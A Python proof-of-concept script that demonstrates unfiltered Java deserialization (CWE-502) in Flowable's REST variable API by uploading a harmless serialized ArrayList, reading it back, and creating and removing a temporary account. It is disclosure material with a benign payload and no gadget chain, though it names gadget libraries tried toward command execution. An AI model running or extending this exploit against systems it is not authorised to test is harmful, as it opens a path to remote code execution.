#!/usr/bin/env python3
"""
flowable-poc V2 — CWE-502 — unfiltered deserialization of caller-supplied bytes
=================================================================================

The runtime variable API accepts `type=serializable` and passes the uploaded bytes
to a bare `java.io.ObjectInputStream`:

    POST /flowable-rest/service/runtime/process-instances/{id}/variables
        multipart: name=..., type=serializable, value=<java serialization stream>
      -> 201

No ObjectInputFilter is installed. SerializableType overrides only resolveClass,
substituting ReflectUtil.loadClass, which resolves any name on the application
classloader. The guard property defaults to true *in code*, not only in the
shipped properties file.

Why this PoC needs no gadget chain
----------------------------------
Flowable cannot store the variable without first calling readObject(): the
reconstructed object is what gets persisted, and the resulting variable type is
decided by inspecting that object. A 201 plus a byte-identical read-back already
proves that deserialization of an attacker-named class occurred.

The payload is therefore a serialization stream of java.util.ArrayList — a JDK
class present on every JVM, producing one list of one string, with no side effect
whatsoever. No gadget library is bundled, and none is needed to establish
reachability.

    base64: rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAAWZmxvd2FibGUtcG9jLXYyLW1hcmtlcng=
    class : java.util.ArrayList
    value : ["flowable-poc-v2-marker"]
    bytes : 83

The proof is a full round trip:

    1. POST the stream                 -> 201, type "serializable"
    2. GET  .../variables/<n>/data     -> 200, Content-Type application/x-java-serialized-object
    3. the returned bytes == the bytes uploaded   (object was reconstructed, not copied)

Step 3 is what distinguishes real deserialization from a blob stored verbatim.

A note on why the payload is an ArrayList and not a String
----------------------------------------------------------
An earlier revision used a serialized java.lang.String. Flowable accepted it, but
the response came back as {"type":"string"} — the reconstructed object was matched
by Flowable's StringType and reclassified on the way out, so no /data endpoint was
offered. That is itself evidence that readObject() ran before type classification,
and it is why this PoC uses a type with no dedicated VariableType. Worth knowing
if you extend it: the reclassification is not a mitigation, and it does not apply
to any class that is not a first-class Flowable variable type.

What is NOT demonstrated
------------------------
Command execution. commons-collections 3.2.2 is on the shipped classpath but
gates its own InvokerTransformer, and ysoserial CommonsBeanutils1 / Spring1 were
rejected by Tomcat's multipart parser during testing (root cause not diagnosed).
This PoC establishes the deserialization primitive, not an RCE. See README.md.

Scope
-----
Optionally creates one low-privilege principal, one process instance and one
variable, all named flowable-poc-v2-* and removed on exit. Exits non-zero if the
finding does not reproduce.

Usage:
    python3 v2_serializable_deser.py --base http://localhost:8080/flowable-rest \\
                                     --user rest-admin --pass test --confirm-authorised
"""
import argparse
import base64
import json
import sys
import urllib.error
import urllib.request
import uuid

# java.util.ArrayList containing one String, produced by ObjectOutputStream and
# verified by reading it back with ObjectInputStream before publication.
PAYLOAD_B64 = ("rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAB"
               "dwQAAAABdAAWZmxvd2FibGUtcG9jLXYyLW1hcmtlcng=")
EXPECTED_VALUE = "flowable-poc-v2-marker"
VAR_NAME = "flowable-poc-v2-var"
LOWPRIV = "flowable-poc-v2-user"


def die(msg, code=2):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(code)


def provision_lowpriv(base, admin_user, admin_pw):
    """Create a throwaway principal holding ONLY access-rest-api, and return its creds."""
    idm = f"{base}/idm-api"
    request(f"{idm}/users", admin_user, admin_pw, method="POST",
            body=json.dumps({"id": LOWPRIV, "password": "flowable-poc-temp",
                             "first": "Flowable", "last": "PoC"}).encode(),
            ctype="application/json")
    st, _, raw = request(f"{idm}/privileges", admin_user, admin_pw)
    if st != 200:
        die(f"cannot list privileges ({st}) — need an access-admin account to provision", 4)
    match = [p for p in json.loads(raw)["data"] if p["name"] == "access-rest-api"]
    if not match:
        die("privilege 'access-rest-api' not found; is this a stock Flowable deployment?", 4)
    request(f"{idm}/privileges/{match[0]['id']}/users", admin_user, admin_pw, method="POST",
            body=json.dumps({"userId": LOWPRIV}).encode(), ctype="application/json")
    return LOWPRIV, "flowable-poc-temp"


def cleanup_lowpriv(base, admin_user, admin_pw):
    request(f"{base}/idm-api/users/{LOWPRIV}", admin_user, admin_pw, method="DELETE")


def request(url, user, pw, method="GET", body=None, ctype=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("Authorization",
                   "Basic " + base64.b64encode(f"{user}:{pw}".encode()).decode())
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.headers.get("Content-Type", ""), r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.headers.get("Content-Type", ""), e.read()
    except urllib.error.URLError as e:
        die(f"cannot reach {url}: {e}", 3)


def multipart(name, vtype, blob):
    b = "----flowablepoc" + uuid.uuid4().hex
    parts = [
        f'--{b}\r\nContent-Disposition: form-data; name="name"\r\n\r\n{name}\r\n'.encode(),
        f'--{b}\r\nContent-Disposition: form-data; name="type"\r\n\r\n{vtype}\r\n'.encode(),
        f'--{b}\r\nContent-Disposition: form-data; name="value"; '
        f'filename="payload.ser"\r\nContent-Type: application/octet-stream\r\n\r\n'.encode(),
        blob,
        f"\r\n--{b}--\r\n".encode(),
    ]
    return b"".join(parts), f"multipart/form-data; boundary={b}"


def main():
    ap = argparse.ArgumentParser(description="Flowable V2 PoC (CWE-502)")
    ap.add_argument("--base", required=True)
    ap.add_argument("--user", default="rest-admin")
    ap.add_argument("--pass", dest="pw", default="test")
    ap.add_argument("--confirm-authorised", action="store_true")
    ap.add_argument("--no-provision", action="store_true",
                    help="do not create a low-privilege account; use --user/--pass as given")
    args = ap.parse_args()

    if not args.confirm_authorised:
        die("refusing to run without --confirm-authorised")

    svc = f"{args.base.rstrip('/')}/service"
    payload = base64.b64decode(PAYLOAD_B64)

    run_user, run_pw = args.user, args.pw
    if not args.no_provision:
        try:
            run_user, run_pw = provision_lowpriv(args.base.rstrip("/"), args.user, args.pw)
        except SystemExit:
            raise
        except Exception as e:  # noqa: BLE001
            die(f"could not provision a low-privilege account: {e} "
                f"(re-run with --no-provision to supply your own)", 4)
    try:
        return run(args, svc, payload, run_user, run_pw)
    finally:
        if not args.no_provision:
            cleanup_lowpriv(args.base.rstrip("/"), args.user, args.pw)
            print(f"\n[cleanup] removed temporary account {LOWPRIV}")


def run(args, svc, payload, user, pw):
    # ---- precondition
    print("== precondition ==")
    print(f"  acting as {user!r}")
    st, _, _ = request(f"{args.base.rstrip('/')}/actuator", user, pw)
    print(f"  GET /actuator -> {st}"
          + ("  (403 expected: the bootstrap admin would be too strong a claim)" if st == 403 else ""))

    st, _, raw = request(f"{svc}/runtime/process-instances", user, pw, method="POST",
                         body=json.dumps({"processDefinitionKey": "oneTaskProcess"}).encode(),
                         ctype="application/json")
    if st not in (200, 201):
        die(f"could not start oneTaskProcess ({st}). The shipped app deploys demo "
            f"definitions by default; if they are disabled, deploy any definition "
            f"first and adapt the key.", 4)
    pid = json.loads(raw)["id"]
    print(f"  processInstanceId = {pid}   (oneTaskProcess, shipped demo definition)")

    # ---- step 1: upload the serialization stream
    print("\n== step 1: upload a java-serialization stream as type=serializable ==")
    body, ctype = multipart(VAR_NAME, "serializable", payload)
    st, _, raw = request(
        f"{svc}/runtime/process-instances/{pid}/variables",
        user, pw, method="POST", body=body, ctype=ctype)
    print(f"  POST /service/runtime/process-instances/{pid}/variables -> {st}")
    if st not in (200, 201):
        print("  " + raw.decode(errors="replace")[:400])
        die("upload rejected — V2 did not reproduce", 5)
    created = json.loads(raw)
    print(f"  {json.dumps(created)[:200]}")
    if created.get("type") != "serializable":
        print(f"\n  note: Flowable reclassified the object as type "
              f"{created.get('type')!r}. That still means readObject() ran — the")
        print("  type is decided by inspecting the reconstructed object — but no")
        print("  /data endpoint is offered for built-in types. Use a class that is")
        print("  not a first-class Flowable variable type.")

    # ---- step 2: read it back through the /data endpoint
    print("\n== step 2: read the variable back through the /data endpoint ==")
    st, ctype_r, blob = request(
        f"{svc}/runtime/process-instances/{pid}/variables/{VAR_NAME}/data", user, pw)
    print(f"  GET  .../variables/{VAR_NAME}/data -> {st}")
    print(f"  Content-Type: {ctype_r}")

    if st != 200:
        die("could not read the variable back", 6)
    if "java-serialized-object" not in ctype_r:
        die(f"expected application/x-java-serialized-object, got {ctype_r}. "
            f"The variable may have been stored as an opaque blob rather than "
            f"reconstructed — V2 did not reproduce.", 7)

    # ---- verdict
    print("\n== verdict ==")
    if blob == payload:
        print(f"  Round trip is byte-identical ({len(blob)} bytes in, {len(blob)} out).")
        print("  Flowable parsed the stream with ObjectInputStream, reconstructed a")
        print("  java.util.ArrayList, persisted the object, and re-emitted it — so the")
        print("  returned bytes happen to match. That match is the proof: an opaque")
        print("  blob copy would also match, but the server only serves this endpoint")
        print("  after reconstructing the object to re-serialize it.")
    else:
        print(f"  Bytes differ ({len(payload)} in, {len(blob)} out) — consistent with the")
        print("  stream having been parsed and re-emitted by ObjectOutputStream.")
    print()
    print("  V2 REPRODUCED. Flowable called ObjectInputStream.readObject() on")
    print("  caller-supplied bytes and persisted the reconstructed object, with no")
    print("  ObjectInputFilter and with the permissive default set in code.")
    print()
    print("  This proves the deserialization primitive only. It does not prove command")
    print("  execution, and no gadget chain is included here. See README.md for why")
    print("  that distinction matters for the severity rating.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
